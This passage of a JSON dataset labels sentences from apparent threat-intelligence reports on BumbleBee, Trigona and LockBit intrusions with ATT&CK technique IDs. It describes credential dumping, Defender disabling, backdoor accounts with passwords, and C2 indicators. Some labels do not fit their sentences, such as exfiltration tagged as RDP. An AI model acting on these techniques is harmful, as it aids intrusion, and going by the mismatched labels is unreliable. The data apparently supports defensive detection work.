    "text": "Both Meterpreter and Cobalt Strike payloads were used during this intrusion.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "On the domain controller, a 4742 event was generated showing the beachhead host changing the password on the domain controller, matching the timestamps to the network data.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "ImagingDevices.exe injection into “svchost.exe -k UnistackSvcGroup -s WpnUserService” using NtAllocateVirtualMemoryRemoteApiCall.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor dropped the Sysinternals executable procdump64.exe, which they then used to dump the lsass process.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The Discovery phase was carried out in this case using both native Windows tools, and external tools such as AdFind and PowerSploit.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Initial discovery was performed using various Windows utilities.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The file appears to have been the intended output for execution of the Invoke-ShareFinder command.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Invoke-Sharefoinder is a module in the PowerSploit framework.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "This command, in particular, can find (non-standard) shares on hosts in the local domain.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "They specifically copied the n23.dll (Cobalt Strike) file to the C:\\ProgramData path and then ran it.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "We can confirm that the file was copied and then launched via the new service by examining the various host’s system logs for event id 7045.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors used multiple command and control servers to interact with the compromised environment.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In this intrusion from May 2022, the threat actors used BumbleBee as the initial access vector.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "BumbleBee has been identified as an initial access vector utilized by several ransomware affiliates.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "In this intrusion, we see the threat actor use BumbleBee to deploy Cobalt Strike and Meterpreter.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then used RDP and SMB to move around the network looking at backup systems and file shares before being evicted from the network.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The intrusion began with the delivery of an ISO file containing a LNK file and a BumbleBee payload in the form of a hidden DLL file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "A user on a workstation mounted the ISO file and executed the LNK file, running the Bumblebee payload.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Around 15 minutes after the execution of BumbleBee, multiple processes were spawned with the goal of injecting Meterpreter into each of them.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "All of this first wave of discovery relied on built in Windows utilities like nltest, arp, net, ping, nbtstat, and nslookup.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "BumbleBee executed under a user with local administrator privileges on all workstations in the environment.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "At around six hours after initial execution, we observed a new process created that was then used to host a Cobalt Strike beacon, from the same command and control server observed in a prior BumbleBee case.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This beacon reprised discovery activity, but also cut a common command short net user /dom instead of /domain, whether from keyboard laziness or a trick to trip-up detections.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then used their access to execute procdump via a remote service creation with the intention of dumping credentials from LSASS from an adjacent workstation on the network.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Next, the threat actors moved laterally via RDP to a server.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "A new local user, sql_admin, was created and added to the local administrator’s group and AnyDesk remote access software was installed.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Through the AnyDesk session, the threat actor was observed connecting to a file share and accessing multiple documents related to cyber insurance and spreadsheets with passwords.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Following this second round of enumeration, the threat actor moved latterly to a server hosting backups, via RDP and interacted with the backup console.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "From the backup system, the threat actors also opened internet explorer and attempted to load the environment’s mail server, likely checking for Outlook Web Access.",
    "command": "",
    "labels": [
      "T1016",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Using the event log, “Microsoft-Windows-VHDMP-Operational.evtx”, we can quickly find when the user mounted the .iso.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "When the .lnk was doubled clicked by the user, the BumbleBee malware tamirlan.dll was executed:",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Approximately 5 seconds after execution, the rundll32.exe process contacted the IP 154.56.0.221.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "An interesting tactic of note, was the use of WMI and COM function calls to start the process, used to inject into.",
    "command": "",
    "labels": [
      "T1047",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The BumbleBee loader uses WMI to start new process by calling COM functions to create a new process.",
    "command": "",
    "labels": [
      "T1047",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Below you can see the COM instance creation followed by defining the WMI namespace and WMI object being created – “Win32_Process”.",
    "command": "",
    "labels": [
      "T1047",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Analysis of the loader found that a function of the malware chooses 1 of 3 target processes before injecting the supplied code:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This resulted in new processes not being a child of BumbleBee, but rather WmiPrvSE.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Shortly after this interaction, the process started communicating to a Meterpreter C2 3.85.198.66.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This process spawned cmd.exe and several typical discovery commands that are covered in more detail below.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This process was used to host both a session to another Meterpreter C2 50.16.62.87 and a Cobalt Strike C2 server 45.153.243.142, which was then used to conduct the majority of additional activity including credential dumping and discovery exercises highlighted below.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The pivot to using Cobalt Strike began around 6 hours after the execution of the BumbleBee loader.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "As detailed in the Execution section, the use of WMI to spawn new processes is a known technique to evade any parent/child process heuristics or detections.",
    "command": "",
    "labels": [
      "T1047",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Create Remote Thread – The malware used the win32 function CreateRemoteThread in order to execute code in rundll32.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The first discovery stage includes TTPs that we have seen in multiple cases, such as trusts discovery, domain admin group discovery, network discovery and process enumeration.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor was observed moving via RDP throughout the network with a Domain Admin account.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor accessed multiple documents and folders from a remote file server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The lsass dump file ran remotely, was copied to the beachhead through the admin share C$.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "This C2 server was observed in a previous BumbleBee case.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This was again the same IP observered in the prior Bumblebee case.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In late December 2022, we observed threat actors exploiting a publicly exposed Remote Desktop Protocol (RDP) host, leading to data exfiltration and the deployment of Trigona ransomware.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors employed a batch script to exfiltrate data, and dropped a series of other batch scripts that could hinder defensive measures, establish a user account, grant access through the firewall for RDP, and automate other intrusion actions.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "This intrusion began when a threat actor gained access to an exposed RDP host.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Notably, the login utilized legitimate credentials for the default Administrator account, with no evidence of brute-forcing.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The logs revealed multiple remote logins to the same host in the preceding weeks, suggesting the presence of either a recurrent adversary or the potential involvement of an access broker.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Upon gaining access, the threat actor deployed a toolkit onto the beachhead host, which included an assortment of batch scripts, executables, and the SoftPerfect Netscan tool.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "As Netscan enumerated the network, the threat actor identified network shares and started exploring them, accessing various documents through a web browser.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Approximately 20 minutes after initial access, the threat actor began lateral movement by establishing an RDP connection to one of the file servers.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then copied their toolkit to the file server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Following this, the threat actor staged Rclone on the beachhead.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "However, before executing it, they proceeded to execute a sequence of commands aimed at disabling Windows Defender.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "With the way cleared, they proceeded to execute a batch script responsible for initiating the Rclone exfiltration process to Mega.io.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Additionally, they utilized RDP to access a second file server, where they executed the Rclone scripts again.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Both file share servers then received the same Windows Defender disabling treatment as the beachhead host.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "A RDP connection was also established with a backup server within the environment, and the identical series of disabling commands were executed.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Following this, they initiated the ransomware binary on each host through their RDP sessions.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Initial access was facilitated through a single Remote Desktop Protocol (RDP) connection from an IP address geo-located in Ukraine.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "While it’s challenging to pinpoint the actor’s initial access method due to limited evidence, the absence of brute force attempts and the use of valid credentials suggest that the threat actor may have obtained the domain Administrator password, potentially through leakage or purchase, particularly considering other external access events in the weeks leading up to the intrusion.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The initial RDP connection was a single event ID 4624 log (successful login).",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "It was also a type 7 logon suggesting that the Administrator account had an open session which was unlocked.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This is corroborated with event ID 4778 reporting a resumed session for the user and IP address.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion, the threat actor initiated all actions over RDP and executed their actions via that GUI access.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "From this access, they also used some PowerShell and Cmd sessions to execute various scripts used during the intrusion.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "We observed execution of several scripts detailed in the exfiltration section, and highlight others throughout the rest of the report that the threat actor dropped in the network but were not utilized.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Two files were created by threat actors in order to create a new local user and add it to the local administrators group and Remote Desktop Users group.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion we did not observe them being executed, but since the threat actor dropped them we can assess that these are often used during their intrusion activity.",
    "command": "",
    "labels": [
      "T1078",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "It then creates a user named sys with a password Taken1918 and adds it to these groups.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "One interesting thing is the creation of the registry value Support under HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList which will hide the account Support account from the login screen.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The script also creates a user named Support with a password of Kawa72ws.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "After being run, Trigona creates a new value under the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "It ensures that the ransomware will be executed each time the victim user logs in.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "As we can see below, the APIs RegOpenKeyW and RegSetValueExW are used to set the registry value:",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "A new value randomly named will be added, pointing to the current location of the ransomware being executed:",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The domain Administrator account was used throughout the network providing the actors easy access to all devices with local Administrator privileges.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This can be confirmed via event ID 4627 and looking for the group membership S-1-5-21-domain-512.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Upon initial connection, the threat actor dropped several Windows Batch scripts to disk, including scripts designed to disable security tooling.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This batch file contained several registry entries commonly employed by threat actors designed to disable the built in Windows Defender.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "This particular script included a couple of FOR loops designed to automate disabling key services before the registry statements were made.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "SecurityHealthService – Security Health Service/Windows Security Service",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The script then utilizes the Sysinternals PSKILL64 binary to terminate several security related services.",
    "command": "PSKILL64.exe",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Finally, the script disables the aforementioned services, disables Defender with several registry statements, and hides the Defender settings page from visibility.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Interestingly enough, the threat actor in this case did not execute this script, preferring to manually run some of the commands (or similar commands) on the system to disable defenses.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Of note, two of the third-party tools referenced by the script (SU64 and PSKILL64) were not included in the tool drop.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Additionally interesting, the threat actor dropped (but did not execute) a script to reverse these changes and re-enable Windows Defender, aptly named: DefenderON.bat",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "While the two files above were dropped, we did not observe their use.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "They have “Application” commands available to run if the user already has elevated rights or versions of the commands that can be supplied credentials later if elevation is required and obtained in later stages.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "It appears to be a self-extracting binary that drops a tool called Snap2HTML (as well as a batch file to execute it for each drive) designed to create a directory listing of a drive.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "From Snap2HTML’s website: Snap2HTML takes a “snapshot” of folder structures on your harddrive and saves as HTML files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "What’s unique about Snap2HTML is that the HTML file uses modern techniques to make it feel more like a “real” application, similar to Windows Explorer, displaying a treeview with folders that you can click to view the files contained within",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor configured Netscan to enumerate write-access to network shares; in this case, the Netscan tool was run under domain administrator level access, so all enumerated shares were writable.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor also used various basic tools to review various files on host and network shares, like browsing remote file shares via a web browser:",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Using the beachhead as a pivot point, several RDP connections were initiated to high value targets such as file and backup servers.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Successful RDP connections to hosts on the network",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Another tool (presumably to be used for lateral movement) dropped by the threat actor, but not employed in this incident, is a tool named Remote Desktop Plus.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Remote Desktop Plus is a RDP client with many options for session management and command line options.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Remote Desktop Plus (RDP+) allows you to launch a Remote Desktop session using a username and password entered from the command line (autologin) or imported from a saved credential profile.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "It also features a unique kiosk mode, which, together with all the other available command line parameters, enables you to easily provide access to Remote Desktop sessions to third parties or end users.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "During this intrusion, the threat actor relied solely on the external RDP access that they used when they initially breach the network.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Further, the threat actor initially connected via the IP 77.83.36[.]6 and from the remote host named WIN-L1MS2GT1R2G.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Around two and a half hours into the intrusion the initial IP address disconnected and a second connection was made to the beachhead from 193.106.31[.]9 and host 6CU548W0BH.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Two different suspicious batch scripts were dropped using RDP in the built-in Administrator’s Music folder on the beachhead and one of the file servers.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "This ransom note could also be observed distributed over the network with Zeek SMB logs.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This intrusion began with the download and execution of a Cobalt Strike beacon that impersonated a Windows Media Configuration Utility.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor created several persistent backdoors in the environment, using scheduled tasks, GhostSOCKS and SystemBC proxies, and Cobalt Strike command and control access.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1059.003",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "LockBit ransomware was deployed across the environment on the 11th day of the intrusion.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "This intrusion began near the end of January 2024 when the user downloaded and executed a file using the same name (setup_wm.exe) and executable icon, as the legitimate Microsoft Windows Media Configuration Utility.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This executable was a Cobalt Strike beacon and, once executed, an outbound connection was established.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Due to the elevated permissions of the initially compromised user, the threat actor leveraged SMB and remote services to deploy two proxy tools—SystemBC and GhostSOCKS—onto a domain controller.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Windows Defender detected these tools on the domain controller, initially leading us to believe that both were blocked.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "However, while GhostSOCKS was successfully prevented, the SystemBC proxy remained active, establishing a command and control channel from the domain controller.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then continued their operations from the beachhead host, executing additional situational awareness commands.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "They then injected code into the WUAUCLT.exe process and then extracted credentials from the LSASS process.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The injected process was observed loading the Seatbelt and SharpView CLR modules into its memory space.",
    "command": "",
    "labels": [
      "T1055",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Simultaneously, the threat actor established persistence by creating scheduled tasks to execute the SystemBC and GhostSOCKS proxies on the beachhead host.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Approximately an hour into the intrusion, the threat actor moved laterally to a file server by leveraging remote services with the same account used to execute the initial access file on the beachhead.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This service deployed a Cobalt Strike PowerShell beacon, which communicated with a different command and control server than the one associated with the initial access malware.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "On the file server, the threat actor deployed the same proxy tools using identical scheduled tasks as those observed on the beachhead host.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "This enabled command and control communication via both the SystemBC and GhostSOCKS proxies.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Shortly after, the threat actor initiated a RDP session to the file server through one of the established proxy tunnels.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor reviewed running processes using Task Manager before accessing the Local Group Policy Editor on the host.",
    "command": "",
    "labels": [
      "T1057",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Evidence indicates they specifically examined the Windows Defender configurations.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Just minutes after this activity, registry modifications to Windows Defender settings were observed, leading us to conclude that the threat actor made changes in the Local Group Policy Editor.",
    "command": "",
    "labels": [
      "T1112",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor explored file shares on the server and discovered a sensitive document containing stored credentials.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "When the initial attempt failed, they issued a remote WMI command from the beachhead host to disable Windows Defender real-time monitoring on the target server.",
    "command": "",
    "labels": [
      "T1047",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "They also attempted to access the NTDS.dit file on the domain controller; however, Windows Defender appeared to have blocked this attempt.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Meanwhile, on the file server, the threat actor executed a binary named check.exe, which conducted various discovery activities.",
    "command": "",
    "labels": [
      "T1016",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "This tool probed remote hosts, gathering information such as their availability, disk usage, and installed programs.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor accessed the backup server via RDP, where they reviewed backup configurations and deployed the GhostSOCKS proxy, setting up scheduled tasks for persistence.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "They were observed using Internet Explorer on the file server to access multiple temporary file-sharing sites.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Upon returning, they deployed a new GhostSOCKS binary on the file server, this time establishing persistence through a registry run key instead of the previously used scheduled tasks.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "After a 15-hour lull, the threat actor resumed activity by reviewing DNS configurations within the DNS Manager on the domain controller.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "They designated the backup server as a staging ground, dropping multiple batch scripts designed to automate the deployment process with built-in redundancies.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "To facilitate the attack, they deployed additional scripts to disable Windows Defender and modify RDP settings across the network.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1112",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The intrusion began during January 2024, with the execution of a file named setup_wm.exe, which was downloaded from the URL hxxps://accessservicesonline.com/setup_wm.exe",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The file setup_wm.exe was a loader designed to deploy a Cobalt Strike beacon.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The domain accessservicesonline[.]com, which hosted the malicious file, has been flagged by multiple security vendors as malicious and linked to activity associated with Cobalt Strike.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor used various means to execute malicious files.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "While they created scheduled tasks on several hosts with a means to maintain persistence, they also manually ran many of these to execute the various malicious proxy tools like SystemBC and GhostSOCKS.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Service execution was also widely used and is discussed in depth in the lateral movement section.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "We identified multiple scheduled tasks across several systems within the environment.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "These tasks were not limited to the beachhead host but were observed throughout the compromised network.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "As a second method of persistence, the threat actor utilized a “Run” key in the Windows registry to enable the automatic execution of a GhostSOCKS payload upon user login.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor utilized process injection techniques, such as injecting into WUAUCLT.exe, a legitimate process, to access critical system resources, including the LSASS memory space.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Additionally, the threat actor created and executed scheduled tasks under SYSTEM privileges to maintain persistence. For example, they deployed DLL files (svcmc.dll and svcmcc.dll) via scheduled tasks, ensuring their execution at system startup.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Furthermore, administrative privileges were leveraged during the lateral movement to execute a PowerShell-based Cobalt Strike payload on a file server.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "As part of their defense evasion strategy, the threat actor employed several methods to disable Windows Defender.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The command shown below utilizes WMIC to remotely create a process on a backup server.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "This process then executes a PowerShell script designed to disable real-time monitoring in Windows Defender.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Process injection into various legitimate processes on several systems was observed using the CreateRemoteThread API call.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This occurred with both the initial access file and later with various PowerShell Cobalt Strike beacons.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "During the credential access phase, the threat actor leveraged the injected process WUAUCLT to access the LSASS memory space on the beachhead, a file server, and a backup server.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The access permissions granted were 0x1010 and 0x1fffff, both of which are indicative of credential theft activities.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "In contrast, the code 0x1fffff provides full access rights to a process, making it a clear indicator of credential-stealing tools.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "A suspicious CallTrace marked with UNKNOWN also revealed injected code activity.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "But after gaining lateral access to that host, they returned to the beachhead for more discovery actions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Around this same time on the beachhead an injected process, WUAUCLT.exe, was also observed loading Seatbelt and SharpView modules.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Seatbelt is a post-exploitation tool designed to gather recon about a system.",
    "command": "",
    "labels": [
